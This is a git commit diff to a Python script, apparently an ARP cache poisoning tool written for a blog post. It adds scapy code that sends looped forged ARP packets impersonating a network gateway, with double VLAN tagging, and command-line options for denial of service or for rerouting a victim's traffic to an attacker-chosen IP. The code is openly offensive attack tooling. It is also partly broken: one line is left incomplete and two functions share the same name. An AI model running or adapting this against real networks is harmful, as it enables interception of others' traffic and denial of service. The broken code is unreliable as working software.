a98a49d2713980cc09fe047de01c4bdf96847f28
ChristopherDiehl <csd92@scarletmail.rutgers.edu>
2016-07-09 21:15:48 -0400

    Re working arp cache poisoner for blog

--- arpcachepoisoning/ARP.py
+++ arpcachepoisoning/ARP.py
@@ -11,13 +11,16 @@ def enable_forwarding():
 #filename is assumed to be valid
 #returns 1 when done
 
-def arp_spoof(victimIp,victimMac, srcIp):
+def arp_spoof(victimIp,gateway, clientMac, yourIp):
 	pkt = ARP()
-	pkt.op= 'is at'
-	pkt.pdst = victimIp
-	pkt.hwdst = victimMac
-	pkt.src = srcIp
-	sendp(pkt,loop = 1)
+	pkt.op="is-at"
+	pkt.pdst = gateway
+	pkt.src = yourIp
+	pkt.
+	send( Ether(dst=clientMac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+	/ARP(op="who-has", psrc=gateway, pdst=victimIp),
+	inter=RandNum(10,40), loop=1 )
+
 def arp_spoof(victimIp, victimMac, iface):
 	pkt = ARP()
 	pkt.op= 2
@@ -36,13 +39,17 @@ def getmac(interface):
   return mac[0:17]
 #calls function arp_monitor_callback
 if __name__ == "__main__":
+
 	if not geteuid() == 0:
 		exit("[-] Rerun with root access")
+		
 	#enable_forwarding()
 	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
-	parser.add_argument('-i', required=True, help= 'Set interface')
-	parser.add_argument('-t', '--targetIp', required=True, help= 'Set Victim Ip Address')
+	parser.add_argument('-t', required=True, help= '[0] DOS, [1] Traffic Re-Routed to Source Ip')
+	parser.add_argument('-s', required=True, help= 'Ip address which recieves rerouted packets')
+	parser.add_argument('-v', '--victimIp', required=True, help= 'Set Victim Ip Address')
 	parser.add_argument('-g', '--gatewayIp',required=True,help= 'Set ip you want to impersonate')
+	parser.add_argument('-o', required = False, help = 'set type of arp packet. Defaut: is-at')
 	args = parser.parse_args()
 
 
